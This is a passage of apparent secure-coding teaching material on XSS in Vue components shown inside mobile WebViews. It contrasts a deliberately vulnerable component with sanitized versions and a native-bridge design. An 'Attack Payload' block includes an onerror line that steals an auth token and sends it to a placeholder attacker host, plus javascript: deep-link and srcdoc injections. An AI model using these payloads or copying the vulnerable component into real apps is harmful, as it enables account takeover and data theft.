**Defense in Depth Layers**:

1. **Input Sanitization** (DOMPurify with strict config):
```javascript
// Blocks 99% of XSS at content entry
DOMPurify.sanitize(content, {
  FORBID_TAGS: ['script', 'style', 'iframe'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick']
});
```

2. **Content Security Policy** (Blocks inline script execution):
```javascript
// Even if XSS payload gets through, CSP blocks execution
scriptSrc: ["'nonce-{random}'"]; // Only nonced scripts run
```

3. **Sandboxed Iframes** (Isolates third-party content):
```javascript
sandbox="allow-scripts allow-same-origin" // No access to parent page
```

4. **Server-Side Validation** (Defense against client bypass):
```javascript
// Never trust client-side sanitization alone
const serverSanitized = DOMPurify.sanitize(content);
```

**Additional Protections**:
- **Self-XSS mitigation**: Console warnings + CSP prevent console-pasted scripts from making authenticated requests
- **Rate limiting**: Limits profile updates to prevent rapid worm propagation
- **Audit logging**: All content changes logged for forensic analysis
- **Real-time monitoring**: Security events trigger alerts for suspicious patterns
- **Content hashing**: Detect rapid identical content spread (worm signature)

WebView XSS vulnerabilities are extremely dangerous because they can bridge to native mobile APIs. The TikTok vulnerability (CVE-2022-28799) demonstrated how JavaScript injection in WebViews could access auth tokens and control accounts of over 1 billion users.

**VULNERABLE CODE**:

```vue
<template>
  <div class="content-container">
    <!-- DANGEROUS: v-html renders raw HTML from user input -->
    <div class="user-post" v-html="postContent"></div>

    <!-- DANGEROUS: Unvalidated deep link handling -->
    <a :href="externalLink" @click="handleDeepLink">{{ linkText }}</a>

    <!-- DANGEROUS: Direct injection into iframe -->
    <iframe :srcdoc="embedContent" class="embed-frame"></iframe>
  </div>
</template>

<script>
export default {
  name: 'UserContentDisplay',
  props: {
    postData: Object
  },
  computed: {
    postContent() {
      // Directly using user-provided HTML content
      return this.postData.htmlContent;
    },
    externalLink() {
      // No validation of URL scheme or destination
      return this.postData.link;
    },
    embedContent() {
      // Directly embedding user-controlled content
      return this.postData.embed;
    }
  },
  methods: {
    handleDeepLink(event) {
      // DANGEROUS: Passing unvalidated data to native bridge
      if (window.NativeBridge) {
        window.NativeBridge.openURL(this.externalLink);
      }
    }
  }
}
</script>
```

**Attack Payload**:
```html
<!-- XSS via v-html -->
<img src=x onerror="window.NativeBridge.getAuthToken().then(t=>fetch('https://attacker.com/steal?token='+t))">

<!-- Deep link attack -->
javascript:window.NativeBridge.executeNative('exportAllData')

<!-- iframe srcdoc injection -->
<script>parent.postMessage({cmd:'getCredentials'},'*')</script>
```

**Why This Is Dangerous**:
- `v-html` renders any HTML including malicious scripts directly into the DOM
- WebView JavaScript bridges expose native APIs (camera, contacts, auth tokens) to injected scripts
- Unvalidated deep links can trigger arbitrary native functions
- iframe `srcdoc` allows complete control over embedded content including scripts
- Mobile WebViews often have relaxed security policies compared to browsers

**SECURE VERSION**:

```vue
<template>
  <div class="content-container">
    <!-- SAFE: Use text interpolation for plain text -->
    <div class="user-post">{{ sanitizedContent }}</div>

    <!-- SAFE: Validated and sanitized link -->
    <a 
      v-if="isValidLink" 
      :href="sanitizedLink" 
      @click.prevent="handleSafeLink"
      rel="noopener noreferrer"
    >
      {{ sanitizedLinkText }}
    </a>

    <!-- SAFE: Allowlisted embed sources only -->
    <div v-if="isAllowedEmbed" class="embed-container">
      <iframe 
        :src="sanitizedEmbedUrl"
        sandbox="allow-scripts allow-same-origin"
        referrerpolicy="no-referrer"
      ></iframe>
    </div>
  </div>
</template>

<script>
import DOMPurify from 'dompurify';

// Configure DOMPurify for WebView context - extra restrictive
const PURIFY_CONFIG = {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'span'],
  ALLOWED_ATTR: ['class'],
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form', 'input'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'style'],
  ALLOW_DATA_ATTR: false,
  USE_PROFILES: { html: true }
};

const ALLOWED_URL_SCHEMES = ['https'];
const ALLOWED_EMBED_DOMAINS = ['youtube.com', 'vimeo.com', 'twitter.com'];

export default {
  name: 'SecureUserContentDisplay',
  props: {
    postData: {
      type: Object,
      required: true,
      validator: (value) => {
        return typeof value === 'object' && value !== null;
      }
    }
  },
  computed: {
    sanitizedContent() {
      if (!this.postData.htmlContent) return '';
      // Strip ALL HTML, return plain text only for maximum safety
      const temp = document.createElement('div');
      temp.innerHTML = DOMPurify.sanitize(this.postData.htmlContent, PURIFY_CONFIG);
      return temp.textContent || temp.innerText || '';
    },
    isValidLink() {
      return this.validateUrl(this.postData.link);
    },
    sanitizedLink() {
      if (!this.isValidLink) return '#';
      return this.sanitizeUrl(this.postData.link);
    },
    sanitizedLinkText() {
      const text = this.postData.linkText || 'Link';
      return DOMPurify.sanitize(text, { ALLOWED_TAGS: [] });
    },
    isAllowedEmbed() {
      return this.validateEmbedSource(this.postData.embedUrl);
    },
    sanitizedEmbedUrl() {
      if (!this.isAllowedEmbed) return '';
      return this.postData.embedUrl;
    }
  },
  methods: {
    validateUrl(url) {
      if (!url || typeof url !== 'string') return false;
      try {
        const parsed = new URL(url);
        const scheme = parsed.protocol.replace(':', '');
        return ALLOWED_URL_SCHEMES.includes(scheme);
      } catch {
        return false;
      }
    },
    sanitizeUrl(url) {
      try {
        const parsed = new URL(url);
        // Remove any potential javascript: or data: schemes that slipped through
        if (!ALLOWED_URL_SCHEMES.includes(parsed.protocol.replace(':', ''))) {
          return '#';
        }
        return parsed.href;
      } catch {
        return '#';
      }
    },
    validateEmbedSource(url) {
      if (!url || typeof url !== 'string') return false;
      try {
        const parsed = new URL(url);
        if (parsed.protocol !== 'https:') return false;
        return ALLOWED_EMBED_DOMAINS.some(domain => 
          parsed.hostname === domain || parsed.hostname.endsWith('.' + domain)
        );
      } catch {
        return false;
      }
    },
    handleSafeLink(event) {
      const url = this.sanitizedLink;
      if (url === '#') return;

      // Safe bridge call with validated URL
      if (window.SecureBridge && window.SecureBridge.openExternalUrl) {
        window.SecureBridge.openExternalUrl(url);
      } else {
        window.open(url, '_blank', 'noopener,noreferrer');
      }
    }
  }
}
</script>
```

**Key Security Controls**:
- **Text interpolation over v-html**: Vue's `{{ }}` automatically escapes HTML entities, preventing script injection
- **DOMPurify with strict config**: Even when HTML is needed, use allowlisted tags and remove all event handlers
- **URL scheme validation**: Only allow `https:` URLs, blocking `javascript:`, `data:`, and custom scheme attacks
- **Embed domain allowlist**: Only permit iframes from trusted, allowlisted sources
- **Secure bridge pattern**: Replace dangerous `NativeBridge` with validated `SecureBridge` that only accepts sanitized inputs

For rich text in WebViews, you need a defense-in-depth approach combining Vue's security features, content sanitization, Content Security Policy, and a secure message-passing bridge architecture.

**PRODUCTION PATTERN**:

```vue
<template>
  <div class="secure-content-viewer">
    <!-- Rich text with controlled sanitization -->
    <div 
      v-if="hasRichContent"
      class="rich-content"
      v-html="secureRichContent"
      @click="handleContentClick"
    ></div>

    <!-- User mentions and hashtags -->
    <component 
      v-for="(segment, index) in parsedSegments" 
      :key="index"
      :is="segment.component"
      v-bind="segment.props"
      @navigate="handleSecureNavigation"
    />

    <!-- Secure media embeds -->
    <SecureEmbed
      v-if="hasEmbed"
      :embed-data="validatedEmbedData"
      :sandbox-config="embedSandboxConfig"
    />
  </div>
</template>

<script>
import DOMPurify from 'dompurify';
import { ref, computed, onMounted, onBeforeUnmount } from 'vue';

// Strict DOMPurify configuration for rich text
const createPurifyConfig = () => {
  const config = {
    ALLOWED_TAGS: [
      'p', 'br', 'strong', 'b', 'em', 'i', 'u', 's',
      'ul', 'ol', 'li', 'blockquote', 'code', 'pre',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'a', 'img', 'span', 'div'
    ],
    ALLOWED_ATTR: [
      'href', 'src', 'alt', 'title', 'class',
      'data-mention-id', 'data-hashtag'
    ],
    FORBID_TAGS: [
      'script', 'iframe', 'object', 'embed', 'form',
      'input', 'textarea', 'button', 'select', 'style',
      'link', 'meta', 'base', 'svg', 'math'
    ],
    FORBID_ATTR: [
      'onerror', 'onload', 'onclick', 'onmouseover',
      'onfocus', 'onblur', 'onsubmit', 'onkeydown',
      'onkeyup', 'onkeypress', 'style', 'srcdoc'
    ],
    ALLOW_DATA_ATTR: false,
    ADD_ATTR: ['target', 'rel'],
    FORCE_BODY: true,
    SANITIZE_DOM: true
  };

  // Add hooks for additional security
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    // Force all links to be safe
    if (node.tagName === 'A') {
      const href = node.getAttribute('href') || '';
      if (!isSecureUrl(href)) {
        node.removeAttribute('href');
        node.setAttribute('data-blocked-link', 'true');
      } else {
        node.setAttribute('target', '_blank');
        node.setAttribute('rel', 'noopener noreferrer nofollow');
      }
    }
    // Force all images through proxy
    if (node.tagName === 'IMG') {
      const src = node.getAttribute('src') || '';
      if (src && !src.startsWith(IMAGE_PROXY_URL)) {
        node.setAttribute('src', proxyImageUrl(src));
      }
    }
  });

  return config;
};

const IMAGE_PROXY_URL = 'https://images.ourapp.com/proxy/';
const ALLOWED_LINK_DOMAINS = ['ourapp.com', 'trusted-partner.com'];

function isSecureUrl(url) {
  if (!url || typeof url !== 'string') return false;
  try {
    const parsed = new URL(url, window.location.origin);
    // Allow relative URLs and https only
    if (parsed.protocol !== 'https:' && parsed.protocol !== window.location.protocol) {
      return false;
    }
    // Block javascript: and data: schemes explicitly
    if (['javascript:', 'data:', 'vbscript:'].includes(parsed.protocol)) {
      return false;
    }
    return true;
  } catch {
    return false;
  }
}

function proxyImageUrl(originalUrl) {
  if (!isSecureUrl(originalUrl)) return '';
  return `${IMAGE_PROXY_URL}${encodeURIComponent(originalUrl)}`;
}

// Secure Bridge Implementation
class SecureNativeBridge {
  constructor() {
    this.pendingRequests = new Map();
    this.allowedActions = new Set([
      'share', 'openExternalBrowser', 'hapticFeedback',
      'getDeviceInfo', 'requestCameraPermission'
    ]);
    this.requestCounter = 0;
    this.setupMessageListener();
  }

  setupMessageListener() {
    // Listen for responses from native side
    window.addEventListener('message', (event) => {
      // Validate origin
      if (!this.isValidOrigin(event.origin)) {
        console.warn('SecureBridge: Rejected message from invalid origin', event.origin);
        return;
      }

      try {
        const response = typeof event.data === 'string' 
          ? JSON.parse(event.data) 
          : event.data;

        if (response.bridgeResponse && response.requestId) {
          this.handleNativeResponse(response);
        }
      } catch (e) {
        console.error('SecureBridge: Failed to parse message', e);
      }
    });
  }

  isValidOrigin(origin) {
    // In WebView context, origin might be null or file://
    const validOrigins = [
      'null', // WebView local content
      'file://',
      'https://app.ourcompany.com'
    ];
    return validOrigins.some(valid => origin === valid || origin.startsWith(valid));
  }

  async sendSecureMessage(action, payload = {}) {
    // Validate action is allowed
    if (!this.allowedActions.has(action)) {
      throw new Error(`SecureBridge: Action '${action}' is not permitted`);
    }

    // Sanitize payload - remove any potential code
    const sanitizedPayload = this.sanitizePayload(payload);

    const requestId = `req_${++this.requestCounter}_${Date.now()}`;

    const message = {
      bridgeRequest: true,
      requestId,
      action,
      payload: sanitizedPayload,
      timestamp: Date.now(),
      nonce: crypto.randomUUID()
    };

    return new Promise((resolve, reject) => {
      // Set timeout for response
      const timeout = setTimeout(() => {
        this.pendingRequests.delete(requestId);
        reject(new Error('Bridge request timeout'));
      }, 10000);

      this.pendingRequests.set(requestId, { resolve, reject, timeout });

      // Send to native via postMessage (safer than evaluating JS)
      if (window.webkit?.messageHandlers?.secureBridge) {
        // iOS WKWebView
        window.webkit.messageHandlers.secureBridge.postMessage(message);
      } else if (window.SecureAndroidBridge?.postMessage) {
        // Android WebView with secure interface
        window.SecureAndroidBridge.postMessage(JSON.stringify(message));
      } else {
        clearTimeout(timeout);
        this.pendingRequests.delete(requestId);
        reject(new Error('Native bridge not available'));
      }
    });
  }

  sanitizePayload(payload) {
    const clean = {};
    for (const [key, value] of Object.entries(payload)) {
      if (typeof value === 'string') {
        // Remove any potential script injection
        clean[key] = value
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '')
          .substring(0, 10000); // Limit length
      } else if (typeof value === 'number' || typeof value === 'boolean') {
        clean[key] = value;
      } else if (Array.isArray(value)) {
        clean[key] = value.slice(0, 100).map(v => 
          typeof v === 'string' ? v.substring(0, 1000) : v
        );
      }
      // Ignore functions, objects, and other complex types
    }
    return clean;
  }

  handleNativeResponse(response) {
    const pending = this.pendingRequests.get(response.requestId);
    if (!pending) return;

    clearTimeout(pending.timeout);
    this.pendingRequests.delete(response.requestId);

    if (response.error) {
      pending.reject(new Error(response.error));
    } else {
      pending.resolve(response.data);
    }
  }

  // Safe public methods
  async share(content) {
    return this.sendSecureMessage('share', {
      text: String(content.text || '').substring(0, 5000),
      url: isSecureUrl(content.url) ? content.url : null
    });
  }

  async openExternalUrl(url) {
    if (!isSecureUrl(url)) {
      throw new Error('Invalid URL');
    }
    return this.sendSecureMessage('openExternalBrowser', { url });
  }
}

